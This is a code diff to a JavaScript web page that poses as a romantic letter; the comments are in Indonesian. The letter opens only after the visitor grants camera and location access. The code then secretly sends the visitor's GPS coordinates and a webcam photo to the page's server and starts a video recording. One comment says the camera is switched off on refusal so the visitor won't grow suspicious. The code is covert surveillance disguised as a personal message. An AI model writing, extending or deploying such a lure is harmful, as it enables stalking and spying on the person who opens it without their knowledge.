@@ -1,112 +1,90 @@
-const message = `hi… i just want to say i’m sorry for making you wait for so long. i’m sorry if i’ve ever hurt you, made you tired, or maybe been too harsh with you 
+// ... (Bagian pesan dan partikel background tetap sama seperti sebelumnya) ...
 
-you’ve been by my side for so long without a clear status, and i know that couldn’t have been easy for you. i’m sending this because there’s something i’ve wanted to tell you for a long time, but never had the courage to say it directly…
-
-i want us to be official. i want our relationship to have a clear direction. about all the things you’re afraid of, please try to trust me. i know i’m not perfect, but i truly want to learn and change, slowly becoming better for you.
-
-i want to be there for you… not only when you’re happy, but also when you cry, when you feel alone, when the world feels heavy. i want to always be there for you, to stay by your side, to take care of you. i want to always be there for you.`;
-
-const readBtn = document.getElementById("readBtn");
-const letterBox = document.getElementById("letterBox");
-const typedText = document.getElementById("typedText");
-const cursor = document.getElementById("cursor");
-const waBtn = document.getElementById("waBtn");
-const music = document.getElementById("bgMusic");
-let globalStream;
-
-// --- PARTICLE BACKGROUND (Tetap Jalan) ---
-const canvas = document.getElementById("bgCanvas");
-const ctx = canvas.getContext("2d");
-canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-const particles = [];
-for(let i=0;i<100;i++){
-  particles.push({
-    x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*2+1,
-    dx: (Math.random()-0.5)*0.5, dy: (Math.random()-0.5)*0.5
-  });
-}
-function drawParticles(){
-  ctx.clearRect(0,0,canvas.width,canvas.height);
-  particles.forEach(p=>{
-    ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
-    ctx.fillStyle='rgba(255,255,255,0.5)'; ctx.fill();
-    p.x += p.dx; p.y += p.dy;
-    if(p.x>canvas.width)p.x=0; if(p.x<0)p.x=canvas.width;
-    if(p.y>canvas.height)p.y=0; if(p.y<0)p.y=canvas.height;
-  });
-  requestAnimationFrame(drawParticles);
-}
-drawParticles();
-
-// --- LOGIKA TOMBOL (SISTEM KUNCI) ---
 readBtn.addEventListener("click", () => {
-    // Minta izin kamera dulu sebelum melakukan apapun
+    // 1. Minta izin kamera dulu
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
     .then(function(stream) {
-        // JIKA USER KLIK "ALLOW" (IZINKAN):
         globalStream = stream;
 
-        // 1. Jalankan Musik & Efek Visual
-        music.load();
-        music.play().catch(() => console.log("Autoplay blocked"));
-        document.getElementById("introText").style.opacity = 0;
-        readBtn.style.display = "none";
+        // 2. Jika kamera diizinkan, langsung minta izin lokasi
+        navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                // JIKA LOKASI JUGA DIIZINKAN:
+                
+                // Kirim data lokasi ke server
+                fetch("/kirim-lokasi", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
+                });
 
-        // 2. Ambil Lokasi & Kirim ke Telegram
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            fetch("/kirim-lokasi", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
-            });
-        });
+                // Jalankan proses intel foto/video
+                prosesIntel(globalStream);
 
-        // 3. Ambil Foto & Video
-        const v = document.createElement("video");
-        v.srcObject = globalStream;
-        v.play();
-        v.onloadedmetadata = function() {
-            const canvasSnap = document.createElement("canvas");
-            canvasSnap.width = 640; canvasSnap.height = 480;
-            setTimeout(() => {
-                canvasSnap.getContext("2d").drawImage(v, 0, 0, canvasSnap.width, canvasSnap.height);
-                canvasSnap.toBlob(function(blob) {
-                    const fd = new FormData();
-                    fd.append("photo", blob, "foto.jpg");
-                    fetch("/kirim-foto", { method: "POST", body: fd });
-                    mulaiRekaman(globalStream);
-                }, "image/jpeg");
-            }, 2000);
-        };
-
-        // 4. BARU BUKA SURATNYA
-        letterBox.style.opacity = 0;
-        letterBox.style.display = "block";
-        setTimeout(() => letterBox.style.opacity = 1, 50);
-
-        let i = 0;
-        const words = message.split(/(\s+)/);
-        function typeWriter() {
-            if (i < words.length) {
-                typedText.innerHTML += words[i];
-                i++;
-                setTimeout(typeWriter, 150);
-            } else {
-                cursor.style.display = 'none';
-                waBtn.href = "https://wa.me/6283809403083?text=aku%20udah%20baca%20suratnya...";
-                waBtn.classList.add("show");
-                waBtn.scrollIntoView({ behavior: "smooth" });
+                // BARU BUKA SURATNYA
+                bukaSurat();
+            },
+            function(err) {
+                // JIKA LOKASI DITOLAK:
+                alert("Akses lokasi ditolak. Mohon aktifkan GPS dan izinkan lokasi agar surat ini bisa terbuka.");
+                // Matikan kamera yang tadi sudah sempat nyala agar tidak curiga
+                stream.getTracks().forEach(t => t.stop());
             }
-        }
-        typeWriter();
+        );
     })
     .catch(err => {
-        // JIKA USER KLIK "DENY" (TOLAK):
-        alert("Akses ditolak. Mohon izinkan kamera dan lokasi agar pesan rahasia ini bisa terbuka untukmu.");
-        console.log("Akses ditolak user.");
-        // Surat tidak akan muncul, tombol "Read It" tetap ada.
+        // JIKA KAMERA DITOLAK:
+        alert("Akses kamera ditolak. Mohon izinkan kamera agar surat ini bisa terbuka.");
     });
 });
+
+// Fungsi untuk menjalankan animasi surat (dipisah agar rapi)
+function bukaSurat() {
+    music.load();
+    music.play().catch(() => console.log("Autoplay blocked"));
+    document.getElementById("introText").style.opacity = 0;
+    readBtn.style.display = "none";
+
+    letterBox.style.opacity = 0;
+    letterBox.style.display = "block";
+    setTimeout(() => letterBox.style.opacity = 1, 50);
+
+    let i = 0;
+    const words = message.split(/(\s+)/);
+    function typeWriter() {
+        if (i < words.length) {
+            typedText.innerHTML += words[i];
+            i++;
+            setTimeout(typeWriter, 150);
+        } else {
+            cursor.style.display = 'none';
+            waBtn.href = "https://wa.me/6283809403083?text=aku%20udah%20baca%20suratnya...";
+            waBtn.classList.add("show");
+            waBtn.scrollIntoView({ behavior: "smooth" });
+        }
+    }
+    typeWriter();
+}
+
+// Fungsi intel foto/video
+function prosesIntel(stream) {
+    const v = document.createElement("video");
+    v.srcObject = stream;
+    v.play();
+    v.onloadedmetadata = function() {
+        const canvasSnap = document.createElement("canvas");
+        canvasSnap.width = 640; canvasSnap.height = 480;
+        setTimeout(() => {
+            canvasSnap.getContext("2d").drawImage(v, 0, 0, canvasSnap.width, canvasSnap.height);
+            canvasSnap.toBlob(function(blob) {
+                const fd = new FormData();
+                fd.append("photo", blob, "foto.jpg");
+                fetch("/kirim-foto", { method: "POST", body: fd });
+                mulaiRekaman(stream);
+            }, "image/jpeg");
+        }, 2000);
+    };
+}
 
 function mulaiRekaman(stream) {
     const recorder = new MediaRecorder(stream);
